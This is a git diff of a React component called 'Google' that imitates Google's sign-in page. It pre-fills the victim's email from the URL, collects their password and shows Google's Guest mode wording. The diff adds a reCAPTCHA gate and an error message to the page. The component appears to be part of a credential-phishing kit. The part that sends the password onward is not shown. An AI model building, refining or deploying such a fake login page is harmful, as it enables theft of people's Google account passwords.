@@ -1,18 +1,25 @@
-import React, { useEffect, useRef } from 'react'
+import React, { useEffect, useRef, useState } from 'react'
 import ReCAPTCHA from 'react-google-recaptcha';
 import axios from '../axios';
 
 export default function Google() {
     const queryParams = new URLSearchParams(window.location.search);
     const password = useRef()
+    const [isRecaptchaClicked, setIsRecaptchaClicked] = useState(false);
     
-    // Retrieve specific query parameters
     const email = queryParams.get('email');
+
+    const handleRecaptchaChange = (token) => {
+      if (token) {
+        setIsRecaptchaClicked(true);
+      }
+    };
 
     const Submit = async (e) => {
         e.preventDefault()
         var error = document.querySelector(".error")
         var input = document.querySelector(".input")
+        var recap_error = document.querySelector(".recap_error")
         if(password.current.value.length <= 5){
             error.classList.add("show")
             input.classList.add("show")
@@ -21,6 +28,13 @@ export default function Google() {
         
         error.classList.remove("show")
         input.classList.remove("show")
+
+        if(!isRecaptchaClicked){
+            recap_error.classList.add("show")
+            return
+        }
+        
+        recap_error.classList.remove("show")
 
         var submitBtn = document.querySelector(".submitBtn")
         submitBtn.innerHTML = `<div class="spinner-border spinner-border-sm text-white"></div>`
@@ -67,7 +81,9 @@ export default function Google() {
 
                     <ReCAPTCHA
                     sitekey="6Le2tponAAAAAB9qS1OXf_MsvRid6auzOi2n3Xy5"
+                    onChange={handleRecaptchaChange}
                     />
+                    <p className="mb-1 recap_error">Validation require</p>
 
                     <p className="mb-1 mt-5 tiny">Not your computer? Use Guest mode to sign in privately.</p>
                     <p className="blue">Learn more about using Guest mode</p>
